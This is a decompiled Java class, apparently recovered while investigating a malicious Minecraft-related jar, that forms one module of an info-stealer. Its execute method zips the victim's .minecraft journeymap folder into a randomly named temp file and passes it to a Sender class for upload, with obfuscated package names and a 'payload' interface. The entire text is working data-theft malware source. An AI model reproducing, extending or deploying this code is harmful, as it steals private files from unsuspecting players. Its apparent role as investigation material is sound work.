/*    */ package idasido.adldaosd.wpiw.payload.impl;
/*    */ 
/*    */ import idasido.adldaosd.wpiw.payload.Payload;
/*    */ import idasido.adldaosd.wpiw.payload.Sender;
/*    */ import idasido.adldaosd.wpiw.util.FileUtil;
/*    */ import java.io.File;
/*    */ import java.io.IOException;
/*    */ import java.nio.file.Files;
/*    */ import java.nio.file.Path;
/*    */ import java.nio.file.Paths;
/*    */ import java.nio.file.attribute.FileAttribute;
/*    */ import java.util.zip.ZipEntry;
/*    */ import java.util.zip.ZipOutputStream;
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ public final class JourneyMap
/*    */   implements Payload
/*    */ {
/*    */   public void execute() throws Exception {
/* 23 */     File packed = new File(System.getenv("TEMP") + "\\" + FileUtil.randomString());
/* 24 */     pack(System.getenv("APPDATA") + "\\.minecraft\\journeymap", packed.getPath());
/* 25 */     Sender.send(packed);
/*    */   }
/*    */ 
/*    */   
/*    */   private void pack(String sourceDirPath, String zipFilePath) throws IOException {
/* 30 */     Path p = Files.createFile(Paths.get(zipFilePath, new String[0]), (FileAttribute<?>[])new FileAttribute[0]);
/* 31 */     ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p, new java.nio.file.OpenOption[0]));
/*    */     try {
/* 33 */       Path pp = Paths.get(sourceDirPath, new String[0]);
/* 34 */       Files.walk(pp, new java.nio.file.FileVisitOption[0])
/* 35 */         .filter(path -> !Files.isDirectory(path, new java.nio.file.LinkOption[0]))
/* 36 */         .filter(path -> !path.toFile().getName().endsWith(".png"))
/* 37 */         .forEach(path -> {
/*    */             ZipEntry zipEntry = new ZipEntry(pp.relativize(path).toString());
/*    */             
/*    */             try {
/*    */               zs.putNextEntry(zipEntry);
/*    */               
/*    */               Files.copy(path, zs);
/*    */               zs.closeEntry();
/* 45 */             } catch (IOException iOException) {}
/*    */           });
/* 47 */       zs.close();
/*    */     } catch (Throwable throwable) {
/*    */       try {
/*    */         zs.close();
/*    */       } catch (Throwable throwable1) {
/*    */         throwable.addSuppressed(throwable1);
/*    */       } 
/*    */       throw throwable;
/*    */     } 
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\impl\JourneyMap.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */